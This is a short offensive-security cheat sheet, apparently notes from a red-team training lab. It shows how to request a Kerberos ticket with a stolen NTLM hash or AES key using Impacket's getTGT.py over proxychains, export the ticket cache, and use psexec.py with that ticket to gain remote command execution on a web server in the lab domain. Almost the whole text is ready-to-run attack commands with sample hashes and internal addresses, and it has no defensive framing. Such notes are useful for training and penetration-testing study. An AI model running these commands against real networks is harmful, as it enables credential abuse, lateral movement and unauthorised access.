# Ask for a TGT with the user's ntlm or aes hash

```bash
proxychains getTGT.py -dc-ip 10.10.122.10 -hashes :60188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
```

---

# Export the ticket

```bash
export KRB5CCNAME=jking.ccache
```

---

# Use the exported ticket

```bash
# dc.dev.cyberbotic.io -> 10.10.122.10
# web.dev.cyberbotic.io -> 10.10.122.30
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```
